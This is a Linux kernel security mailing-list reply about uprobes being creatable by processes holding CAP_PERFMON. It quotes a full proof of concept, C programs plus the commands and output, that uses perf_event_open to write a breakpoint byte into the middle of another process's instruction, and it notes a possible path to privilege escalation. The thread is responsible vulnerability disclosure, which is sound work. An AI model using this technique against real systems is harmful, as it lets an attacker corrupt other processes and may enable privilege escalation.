Return-Path: <linux-security-module+bounces-10898-lists+linux-security-module=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-security-module@lfdr.de
Delivered-To: lists+linux-security-module@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 34ACCAF135E
	for <lists+linux-security-module@lfdr.de>; Wed,  2 Jul 2025 13:13:32 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id DA4493A3E53
	for <lists+linux-security-module@lfdr.de>; Wed,  2 Jul 2025 11:13:05 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DC82E256C70;
	Wed,  2 Jul 2025 11:13:26 +0000 (UTC)
X-Original-To: linux-security-module@vger.kernel.org
Received: from foss.arm.com (foss.arm.com [217.140.110.172])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5E72123956E;
	Wed,  2 Jul 2025 11:13:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.140.110.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751454806; cv=none; b=M65k/MUrHDWp/fud7jB0wRiyZ5dc8qbYFmDVUN9oa8551pXv9HGgqmSSayeqcu2CyG1Aknu9cxMYrCVwMd4w44FFtSeHww+93W2vPVqEVm0/gUqkg4KIIcJNeTsZDJYGqLmhFxH0CpCOE6GSQscSXavLQS+rJVX9ZmsaEesRSf0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751454806; c=relaxed/simple;
	bh=O4m4hWzSFeOYN9mZ0ZgX38tbQ6F3yuF4mDW0ZT8cyHc=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=l1XWStTBuDdiJEYt+mOO31EkBQgi7F7GInmEgOa56Dx1hS1bp1MREI4P4ZP/ydz9NJzgt6RUrq+zP4ykyNTKh89Fb82x+FJgx3fSF3g2rzncmw8N58MXhGE50YoeJYdMRyyeeY2f96j8RPL55n7tkqCcpXA3b0GNfI/T2RF2bSg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com; spf=pass smtp.mailfrom=arm.com; arc=none smtp.client-ip=217.140.110.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=arm.com
Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 9351B22D9;
	Wed,  2 Jul 2025 04:13:08 -0700 (PDT)
Received: from J2N7QTR9R3 (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPSA id 17FBE3F6A8;
	Wed,  2 Jul 2025 04:13:19 -0700 (PDT)
Date: Wed, 2 Jul 2025 12:13:17 +0100
From: Mark Rutland <mark.rutland@arm.com>
To: Jann Horn <jannh@google.com>
Cc: Serge Hallyn <serge@hallyn.com>,
	linux-security-module <linux-security-module@vger.kernel.org>,
	Peter Zijlstra <peterz@infradead.org>,
	Ingo Molnar <mingo@redhat.com>,
	Arnaldo Carvalho de Melo <acme@kernel.org>,
	Namhyung Kim <namhyung@kernel.org>,
	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
	Adrian Hunter <adrian.hunter@intel.com>,
	"Liang, Kan" <kan.liang@linux.intel.com>,
	linux-perf-users@vger.kernel.org,
	Kernel Hardening <kernel-hardening@lists.openwall.com>,
	linux-hardening@vger.kernel.org,
	kernel list <linux-kernel@vger.kernel.org>,
	Alexey Budankov <alexey.budankov@linux.intel.com>,
	James Morris <jamorris@linux.microsoft.com>
Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
Precedence: bulk
X-Mailing-List: linux-security-module@vger.kernel.org
List-Id: <linux-security-module.vger.kernel.org>
List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>

On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
> Since commit c9e0924e5c2b ("perf/core: open access to probes for
> CAP_PERFMON privileged process"), it is possible to create uprobes
> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
> have destructive effects, while my understanding is that CAP_PERFMON
> is supposed to only let you _read_ stuff (like registers and stack
> memory) from other processes, but not modify their execution.

I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
leave that discussion to others. I agree it seems undesirable to permit
destructive effects.

> uprobes (at least on x86) can be destructive because they have no
> protection against poking in the middle of an instruction; basically
> as long as the kernel manages to decode the instruction bytes at the
> caller-specified offset as a relocatable instruction, a breakpoint
> instruction can be installed at that offset.

FWIW, similar issues would apply to other architectures (even those like
arm64 where instuctions are fixed-size and naturally aligned), as a
uprobe could be placed on a literal pool in a text section, corrupting
data.

It looks like c9e0924e5c2b reverts cleanly, so that's an option.

Mark.

> This means uprobes can be used to alter what happens in another
> process. It would probably be a good idea to go back to requiring
> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
> where the kernel can prove that the software breakpoint poke cannot
> break the target process. (Which seems harder than doing it for
> kprobe, since kprobe can at least rely on symbols to figure out where
> a function starts...)
> 
> As a small example, in one terminal:
> ```
> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
> #include <unistd.h>
> #include <stdio.h>
> 
> __attribute__((noinline))
> void bar(unsigned long value) {
>   printf("bar(0x%lx)\n", value);
> }
> 
> __attribute__((noinline))
> void foo(unsigned long value) {
>   value += 0x90909090;
>   bar(value);
> }
> 
> void (*foo_ptr)(unsigned long value) = foo;
> 
> int main(void) {
>   while (1) {
>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
> *)(void*)foo)[1]);
>     foo_ptr(0);
>     sleep(1);
>   }
> }
> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
> [...]
> 00000000000011b0 <foo>:
>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
>     11b5:       48 01 c7                add    %rax,%rdi
>     11b8:       eb d6                   jmp    1190 <bar>
> [...]
> jannh@horn:~/test/perfmon-uprobepoke$ ./target
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> ```
> 
> and in another terminal:
> ```
> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <unistd.h>
> #include <err.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <linux/perf_event.h>
> 
> int main(void) {
>   int uprobe_type;
>   FILE *uprobe_type_file =
> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
>   if (uprobe_type_file == NULL)
>     err(1, "fopen uprobe type");
>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
>     errx(1, "read uprobe type");
>   fclose(uprobe_type_file);
>   printf("uprobe type is %d\n", uprobe_type);
> 
>   unsigned long target_off;
>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
>   if (!pof)
>     err(1, "popen nm");
>   if (fscanf(pof, "%lx", &target_off) != 1)
>     errx(1, "read target offset");
>   pclose(pof);
>   target_off += 1;
>   printf("will poke at 0x%lx\n", target_off);
> 
>   struct perf_event_attr attr = {
>     .type = uprobe_type,
>     .size = sizeof(struct perf_event_attr),
>     .sample_period = 100000,
>     .sample_type = PERF_SAMPLE_IP,
>     .uprobe_path = (unsigned long)"target",
>     .probe_offset = target_off
>   };
>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
>   if (perf_fd == -1)
>     err(1, "perf_event_open");
>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
>   if (map == MAP_FAILED)
>     err(1, "mmap error");
>   printf("mmap success\n");
>   while (1) pause();
> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
> uprobe type is 9
> will poke at 0x11b1
> mmap success
> ```
> 
> This results in the first terminal changing output as follows, showing
> that 0xcc was written into the middle of the "mov" instruction,
> modifying its immediate operand:
> ```
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0xcc
> bar(0x909090cc)
> byte 1 of foo(): 0xcc
> bar(0x909090cc)
> ```
> 
> It's probably possible to turn this into a privilege escalation by
> doing things like clobbering part of the distance of a jump or call
> instruction.

